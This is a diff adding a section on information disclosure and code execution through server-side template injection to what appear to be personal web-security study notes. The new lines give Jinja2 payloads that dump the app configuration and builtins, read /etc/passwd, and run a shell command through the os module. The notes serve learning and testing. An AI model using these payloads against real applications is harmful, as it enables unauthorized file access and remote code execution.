@@ -57,3 +57,13 @@ the following test string is commonly used to provoke an error message in a web 
 
 ![[Pasted image 20250422180816.png]]
 Check using this Diagram given, if it works then follow Green Arrow else follow Red Arrow.
+
+## Information Disclosure using SSTI
+To obtain the web application's configuration using SSTI : `{{ config.items() }}`
+
+To dump all built-in functions : `{{ self.__init__.__globals__.__builtins__ }}`
+
+To open a file : `{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}`
+
+For remote code execution we can use : `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` | In this command, it first imports the OS library and then runs the command 'id'.
+
